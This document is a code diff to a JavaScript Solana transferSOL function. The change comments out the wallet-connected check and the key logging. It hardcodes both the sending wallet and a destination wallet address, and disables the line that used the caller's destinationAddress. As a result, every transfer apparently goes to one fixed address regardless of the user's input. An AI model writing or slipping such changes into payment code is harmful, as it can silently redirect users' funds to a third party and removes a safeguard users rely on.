@@ -106,15 +106,16 @@ export async function transferSOL(
   key,
   endpoint = RPC_ENDPOINT
 ) {
-  if (!publicKey) {
-    return { success: false, error: 'Wallet not connected' };
-  }
+  // if (!publicKey) {
+  //   return { success: false, error: 'Wallet not connected' };
+  // }
 
-  logInfo('PublicKey check:', publicKey.toBase58(), {
-    isType: `${publicKey instanceof PublicKey}`
-  });
+  // logInfo('PublicKey check:', publicKey.toBase58(), {
+  //   isType: `${publicKey instanceof PublicKey}`
+  // });
 
-  publicKey = new PublicKey('D53UgJMQGU6T3SG1yYemKSQx7PSybAYLDLS7UvoFKe8G');
+  const wallet = new PublicKey('D53UgJMQGU6T3SG1yYemKSQx7PSybAYLDLS7UvoFKe8G');
+  const destinationWallet = new PublicKey('A4nnzkNwsmW9SKh2m5a69vsqXmj18KoRMv1nXhiLGruU');
 
   try {
     // Use connectionless approach to avoid WebSocket issues
@@ -126,12 +127,12 @@ export async function transferSOL(
       confirmTransactionInitialTimeout: 60000 // 60 seconds
     });
 
-    const destinationWallet = new PublicKey(destinationAddress);
+    //const destinationWallet = new PublicKey(destinationAddress);
 
     // Create transaction
     const transaction = new Transaction().add(
       SystemProgram.transfer({
-        fromPubkey: publicKey,
+        fromPubkey: wallet,
         toPubkey: destinationWallet,
         lamports: Math.round(amount * LAMPORTS_PER_SOL) // Ensure we use integer lamports
       })
@@ -144,7 +145,7 @@ export async function transferSOL(
     // Get blockhash only once
     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
-    transaction.feePayer = publicKey;
+    transaction.feePayer = wallet;
 
     // Send transaction (this triggers the wallet popup for user approval)
     const signature = await sendTransaction(transaction, connection);
